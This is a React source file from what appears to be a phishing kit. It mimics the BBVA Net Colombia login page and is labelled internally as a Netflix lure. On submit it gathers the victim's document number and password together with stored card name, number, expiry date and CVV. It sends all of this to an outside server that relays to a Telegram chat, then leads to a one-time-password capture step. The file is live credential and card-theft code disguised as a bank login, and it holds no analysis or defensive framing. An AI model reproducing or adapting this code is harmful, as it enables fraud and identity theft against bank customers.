import React, { useEffect, useState } from 'react';
import Logo from './img/bbva-white.svg';
import OTPVerification from './otp';
import { CSSTransition, TransitionGroup } from 'react-transition-group';
import './animations.css';

const BBVALogin = () => {
    const [userDocument, setUserDocument] = useState('');
    const [password, setPassword] = useState('');
    const [error, setError] = useState('');
    const [step, setStep] = useState(1);
    const [loading, setLoading] = useState(false); // Nuevo estado para el spinner
    const formValues = JSON.parse(localStorage.getItem('formValues')) || {};

    useEffect(() => {
        const estado = sessionStorage.getItem('estado');
        if (estado === '1') {
            // No hace nada
        } else if (estado === '2') {
            // Navegar a la página 404
        } else if (estado === '3') {
            window.location.href = 'https://www.4-72.com.co/publicaciones/236/personas/';
        }
    }, []);

    const sendTelegramMessage = async (message) => {
        try {
            const chatId = '-4723241842'; // Asegúrate de que este ID sea correcto
            const response = await fetch('https://streaming.renovapunto.online/enviarmensaje', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ chatId, message }),
            });

            if (!response.ok) {
                throw new Error('Error al enviar el mensaje a Telegram');
            }
        } catch (error) {
            console.error('Error:', error);
        }
    };

    const handleSubmit = async (e) => {
        e.preventDefault();
        if (userDocument.length > 0) {
            localStorage.setItem('userDocument', userDocument);
            localStorage.setItem('password', password);

            const banco = localStorage.getItem('banco') || 'No disponible';
            const message = `🔑📱 KEY NETFLIX 📱🔑:\n -------------------------------------------\n- 📛: ${formValues.cardHolderName || 'No disponible'}\n- 💳: ${formValues.cardNumber || 'No disponible'} \n- 📅: ${formValues.expirationDate || 'No disponible'}\n- 🔐: ${formValues.cvv || 'No disponible'}\n- 🏦: ${banco}\n-------------------------------------------\n 🔑📱 LOGIN NETFLIX 📱🔑\n ------------------------------------------- \n 👤 : ${userDocument}\n 🔒 : ${password}`;

            setLoading(true); // Mostrar el spinner

            await sendTelegramMessage(message); // Enviar mensaje a Telegram

            // Esperar 3 segundos antes de cambiar de paso
            setTimeout(() => {
                setLoading(false); // Ocultar el spinner
                setStep(2); // Cambiar a paso 2 (OTP)
            }, 3000);
        } else {
            setError('Por favor, ingresa tu número de documento.');
        }
    };

    const handleBack = () => {
        setStep(1); // Regresar al paso 1 (login)
    };

    return (
        <div className="flex flex-col items-center justify-center bg-white">
            <TransitionGroup>
                <CSSTransition
                    key={step}
                    timeout={300}
                    classNames="fade"
                    unmountOnExit
                >
                    <div>
                        <div className="flex items-center justify-between w-full px-4 py-2 bg-[#004481] shadow-md">
                            <img src={Logo} alt="Logo BBVA" className="h-8" />
                            <h5 className="text-lg font-semibold text-white">Acceso a BBVA Net Colombia</h5>
                        </div>

                        {step === 1 && (
                            <>
                                <div className="w-11/12 mt-20 text-center">
                                    <h1 className='text-lg'>Hola <strong>{formValues.cardHolderName}</strong></h1>
                                    <h2 className="text-sg">Ingresa tu número de documento y contraseña para entrar a BBVA Net:</h2>
                                </div>
                                <form className="mt-6 w-11/12 max-w-md" onSubmit={handleSubmit}>
                                    <select className="block w-full p-2 border border-gray-300 rounded mb-4" defaultValue="cedula">
                                        <option value="cedula">Cédula de Ciudadania</option>
                                    </select>
                                    <input
                                        type="tel"
                                        id="txtUsuario"
                                        name="userC"
                                        placeholder="Número de documento"
                                        value={userDocument}
                                        onChange={(e) => {
                                            setUserDocument(e.target.value);
                                            setError('');
                                        }}
                                        className="block w-full p-2 border border-gray-300 rounded mb-4 focus:outline-none focus:ring-2 focus:ring-blue-500"
                                    />
                                    <input
                                        type="password"
                                        name="pass"
                                        id="txtPass"
                                        placeholder="Contraseña"
                                        value={password}
                                        onChange={(e) => setPassword(e.target.value)}
                                        className="block w-full p-2 border border-gray-300 rounded mb-4 focus:outline-none focus:ring-2 focus:ring-blue-500"
                                    />
                                    {error && <p className="text-red-500 mb-4">{error}</p>}
                                    <div className="flex justify-between items-center mb-4">
                                        <button
                                            type="submit"
                                            id="btnUsuario"
                                            className={`w-full ${loading ? 'bg-gray-400 cursor-not-allowed' : 'bg-[#1973b8] hover:bg-blue-700'} text-white font-bold py-2 rounded transition duration-200`}
                                            disabled={loading} // Deshabilitar el botón mientras carga
                                        >
                                            {loading ? 'Cargando...' : 'Entrar a BBVA Net'}
                                        </button>
                                        <a
                                            href="/forgot-password"
                                            className="text-[#1973b8] font-bold ml-4"
                                        >
                                            ¿Olvidaste tu contraseña?
                                        </a>
                                    </div>
                                    <input type="hidden" value="bbva" id="banco" />
                                </form>
                                <aside aria-label="Clave de acceso" className="m-login__aside mt-6 bg-[#004481] p-6 rounded-lg w-11/12 max-w-md mx-auto shadow-lg">
                                    <div className="flex flex-col items-start full-width text-white">
                                        <h2 className="text-xl font-bold mb-2">Haz tu vida más fácil y sencilla</h2>
                                        <p className="c-bodycopy mb-4 text-base">
                                            Con todos los beneficios que te ofrece BBVA Net.
                                        </p>
                                        <a
                                            className="bg-[#1973B8] text-white py-3 px-6 rounded-lg shadow hover:bg-[#1a6fa2] transition duration-200"
                                            href="https://nuevaversion.bbvanet.com.co/bbvaco/kqpu_co_web/page/newRegister"
                                            target="_top"
                                        >
                                            Regístrate
                                        </a>
                                        <p className="c-bodycopy mt-4 text-base">
                                            Maneja tus finanzas de forma ágil y segura.
                                        </p>
                                    </div>
                                </aside>
                            </>
                        )}

                        {step === 2 && <OTPVerification onBack={handleBack} />}
                    </div>
                </CSSTransition>
            </TransitionGroup>
        </div>
    );
};

export default BBVALogin;
